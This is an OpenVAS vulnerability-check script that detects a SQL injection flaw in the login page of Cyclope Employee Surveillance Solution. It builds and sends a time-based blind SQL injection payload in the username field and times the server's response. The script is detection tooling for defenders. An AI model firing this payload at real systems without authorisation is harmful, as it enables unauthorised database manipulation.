###############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_cyclope_employee_surveillance_sql_inj_vuln.nasl 11888 2018-10-12 15:27:49Z cfischer $
#
# Cyclope Employee Surveillance Solution SQL Injection Vulnerability
#
# Authors:
# Rachana Shetty <srachana@secpod.com>
#
# Copyright:
# Copyright (c) 2012 Greenbone Networks GmbH, http://www.greenbone.net
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.803006");
  script_version("$Revision: 11888 $");
  script_tag(name:"cvss_base", value:"7.5");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:P/A:P");
  script_tag(name:"last_modification", value:"$Date: 2018-10-12 17:27:49 +0200 (Fri, 12 Oct 2018) $");
  script_tag(name:"creation_date", value:"2012-08-14 10:50:03 +0530 (Tue, 14 Aug 2012)");
  script_name("Cyclope Employee Surveillance Solution SQL Injection Vulnerability");
  script_xref(name:"URL", value:"http://secunia.com/advisories/50200");
  script_xref(name:"URL", value:"http://www.exploit-db.com/exploits/20393");
  script_xref(name:"URL", value:"http://packetstormsecurity.org/files/115406/cyclope-sql.txt");

  script_category(ACT_ATTACK);
  script_copyright("Copyright (c) 2012 Greenbone Networks GmbH");
  script_family("Web application abuses");
  script_dependencies("find_service.nasl", "http_version.nasl");
  script_require_ports("Services/www", 7879);
  script_exclude_keys("Settings/disable_cgi_scanning");

  script_tag(name:"impact", value:"Successful exploitation will let attackers to manipulate SQL
  queries by injecting arbitrary SQL code.");
  script_tag(name:"affected", value:"Cyclope Employee Surveillance Solution version 6.0.8.5 and
  prior");
  script_tag(name:"insight", value:"Input passed to 'username' and 'password' parameter in '/index.php'
  page is not properly verified before being used in SQL queries.");
  script_tag(name:"solution", value:"Update to version 6.2.1 or later.");
  script_tag(name:"summary", value:"This host is running Cyclope Employee Surveillance Solution
  and is prone to SQL injection vulnerability.");
  script_tag(name:"solution_type", value:"VendorFix");

  script_tag(name:"qod_type", value:"remote_app");

  script_xref(name:"URL", value:"http://www.cyclope-series.com");
  exit(0);
}

include("http_func.inc");
include("http_keepalive.inc");

port = get_http_port(default:7879);

if(!can_host_php(port:port)){
  exit(0);
}

host = http_host_name(port:port);

url = "/index.php";

rcvRes = http_get_cache(item:url, port:port);

if(rcvRes && rcvRes =~ "HTTP/1.. 200" && '<title>Cyclope' >< rcvRes &&
   "Cyclope Employee Surveillance Solution" >< rcvRes)
{
  postdata1 = "act=auth-login&pag=login&username=xxx&password=aaa";

  req1 = string("POST ", url, " HTTP/1.1\r\n",
                "Host: ", host, "\r\n",
                "Content-Type: application/x-www-form-urlencoded\r\n",
                "Content-Length: ", strlen(postdata1), "\r\n",
                "\r\n", postdata1);

  ## Initial time
  nor_start1 = unixtime();

  ## Send the attack
  res = http_keepalive_send_recv(port:port, data:req1);

  nor_stop1 = unixtime();

  postdata2 = "act=auth-login&pag=login&username=x%27+or+sleep%2810%29+and+" +
              "%271%27%3D%271&password=aaa";

  req2 = string("POST ", url, " HTTP/1.1\r\n",
                "Host: ", host, "\r\n",
                "Content-Type: application/x-www-form-urlencoded\r\n",
                "Content-Length: ", strlen(postdata2), "\r\n",
                "\r\n", postdata2);

  nor_start2  = unixtime();

  ## Send the attack
  res = http_keepalive_send_recv(port:port, data:req2);

  nor_stop2 = unixtime();

  if(res && res =~ "HTTP/1.. 200" && (nor_stop1 - nor_start1) < 2
     && (nor_stop2 - nor_start2 > 10))
  {
    security_message(port:port);
    exit(0);
  }
}

exit(99);
